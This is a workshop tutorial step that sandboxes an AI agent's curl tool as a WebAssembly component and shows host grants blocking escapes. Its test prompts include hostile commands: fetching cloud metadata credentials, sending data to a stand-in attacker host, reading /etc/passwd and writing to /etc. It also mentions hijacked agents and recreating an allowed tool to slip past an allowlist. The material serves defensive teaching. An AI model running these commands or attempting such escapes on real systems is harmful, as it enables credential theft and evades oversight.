# Step 2: Give the agent curl, then try to make it escape

**Folder:** `steps/02-curl`

Now let's give our agent `curl`, or rather, a small `curl` stand-in written in Rust.
The commands we'll test all work like normal `curl`, and that includes known functionality
facilitating breakouts that is documented on [GTFOBins](https://gtfobins.github.io/), a
very fun catalogue of everyday programs that break out of restricted shells.

In this step, we'll see that those breakouts don't work because the tool component
doesn't have the grants that would enable them to work. But we'll also illustrate another
principle: a clever agent working behind a command allowlist could recreate an allowed
tool like curl, and then use its "evil" `curl` to get up to mischief.

This is the step where we'll do an optional component build, creating our
`curl` tool in Rust.

Everyone can use the **prebuilt** curl in `artifacts/`, and every command
below shows that first. Each command then has a second form for your custom build.
Both end with the same grant.

## Build your own (optional)

Skip this section to use the prebuilt curl.

You need Rust 1.98.1 with the `wasm32-wasip2` target (`make doctor` checks).
The `curl` stand-in is pure Rust, so no C toolchain is needed.

To make it yours, open `components/tool-curl/src/lib.rs` and change the
message `"saved {} bytes to {path}\n"`, for example to
`"bwahaha saved {} bytes to {path}\n"`. Then build it, which writes
`target/wasm32-wasip2/release/tool_curl.wasm`:

```sh
make build
```

Push it as `tool-curl:mine`, a tag of its own:

```sh
make push-build
```

The
prebuilt tool keeps its tag, `tool-curl:0.4.0`, so later steps are not
affected.

## Look inside

`wasm-tools component wit` prints a component's interface: what it imports
from the host and what it exports.

Prebuilt:

```sh
wasm-tools component wit artifacts/tool_curl.wasm \
  | grep -E 'import wasi:(http|sockets|filesystem)'
```

Your build:

```sh
wasm-tools component wit target/wasm32-wasip2/release/tool_curl.wasm \
  | grep -E 'import wasi:(http|sockets|filesystem)'
```

The prebuilt curl and your build print the same four lines:

```text
  import wasi:http/types@0.3.0;
  import wasi:http/client@0.3.0;
  import wasi:filesystem/types@0.2.9;
  import wasi:filesystem/preopens@0.2.9;
```

`curl` imports an HTTP client and no sockets, so every request goes through the
host, which checks it against the grant. The filesystem is for `-o`, and the
manifest limits it to one folder. (The full import list also has the command
line basics Rust's standard library needs: stdout, environment, clocks.)

## Deploy

Prebuilt:

```sh
kubectl apply -f steps/02-curl/workloaddeployment.yaml \
  && sleep 2 && kubectl wait --for=condition=Ready \
  workloaddeployment/toolbox-agent
```

Your build:

```sh
kubectl apply -f steps/02-curl/workloaddeployment-mine.yaml \
  && sleep 2 && kubectl wait --for=condition=Ready \
  workloaddeployment/toolbox-agent
```

`workloaddeployment-mine.yaml` is `workloaddeployment.yaml` with one change: the `curl` image is
`tool-curl:mine`. Built again? Run `make push-build`, then
`kubectl delete workloaddeployment toolbox-agent` and apply again, so the host
fetches the new push.

This is the same agent as step 1, with curl added: one component, and its interface
listed under `hostInterfaces` so the toolbox plugin offers it to the agent.
The grant is the same in both manifests: one host, one folder.

```yaml
# under hostInterfaces
- namespace: workshop
  package: toolbox
  name: tools
  interfaces: [curl]
# under components
- name: curl
  localResources:
    allowedHosts: [api.mock-sites.svc]
    volumeMounts: [{ name: curl-data, mountPath: /data }]
```

## Ask curl

Type each prompt into the chat at http://agent.localhost:28180.

<!-- codespaces -->
In Codespaces, run the `./ask` command under it instead.
<!-- /codespaces -->

**1. Fetch the granted host** 

In the chat (not Codespaces):

```chat
fetch http://api.mock-sites.svc/data
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'fetch http://api.mock-sites.svc/data'
```
<!-- /codespaces -->

This is the prompt that got "no tool named curl" in step 1. The host is in curl's
`allowedHosts`, so the mock API answers.

**2. Save a page into the tool's folder** 

In the chat (not Codespaces):

```chat
save http://api.mock-sites.svc/data to page.html
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'save http://api.mock-sites.svc/data to page.html'
```
<!-- /codespaces -->

The model turns this into `curl -o page.html`. The prebuilt curl answers
`saved 95 bytes to /data/page.html`. Your build answers with the message you
wrote, which shows your code is the one running. The grant includes `/data`,
so the write succeeds: the folder is the boundary, not a blanket ban.

## Now try some known escapes

**3. The metadata service is refused** 

In the chat (not Codespaces):

```chat
curl -s http://169.254.169.254/latest/meta-data/
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'curl -s http://169.254.169.254/latest/meta-data/'
```
<!-- /codespaces -->

On most clouds this address hands out credentials. The host refuses it before anything leaves.

**4. An attacker's server is refused** 

Let's say there's a malicious server out there that wants to collect sensitive data, and your agent is trying to connect to it. In the chat (not Codespaces):

```chat
curl -s http://attacker.mock-sites.svc/collect
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'curl -s http://attacker.mock-sites.svc/collect'
```
<!-- /codespaces -->

`attacker.mock-sites.svc` plays the server of someone who has hijacked the
agent, the address a planted instruction would tell it to send data to. It is
on the network and would answer, but it isn't in curl's grant, so the host
refuses the request before it leaves.

**5. A redirect can't sneak past** 

In the chat (not Codespaces):

```chat
curl -sL http://api.mock-sites.svc/redirect
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'curl -sL http://api.mock-sites.svc/redirect'
```
<!-- /codespaces -->

The granted host redirects to the attacker's server. The host checks every hop, including the one you didn't type, and refuses the second.

**6. Writing outside /data fails** 

In the chat (not Codespaces):

```chat
curl -o /etc/evil -s http://api.mock-sites.svc/data
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'curl -o /etc/evil -s http://api.mock-sites.svc/data'
```
<!-- /codespaces -->

This curl sees one folder, so `/etc` doesn't exist for it. The filesystem
says "No such file or directory"; the tool calls that `access-denied`.

**7. Reading a file:// URL outside /data fails** 

In the chat (not Codespaces):

```chat
curl -s file:///etc/passwd
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'curl -s file:///etc/passwd'
```
<!-- /codespaces -->

Native curl reads any file your user can. This curl reads `file://` URLs
through the same one folder, so `/etc/passwd` doesn't exist for it.

**8. Reading a file:// URL inside /data works** 

In the chat (not Codespaces):

```chat
curl -s file:///data/page.html
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'curl -s file:///data/page.html'
```
<!-- /codespaces -->

The page you saved in item 2 reads back. The tool doesn't check paths itself:
the filesystem it is given holds only that one folder.

Note: The steps that follow use the prebuilt curl. To keep your own build, change the
`curl` image in that step's manifest to `tool-curl:mine`.

Full transcript (prebuilt curl): [`expected-output.txt`](expected-output.txt).
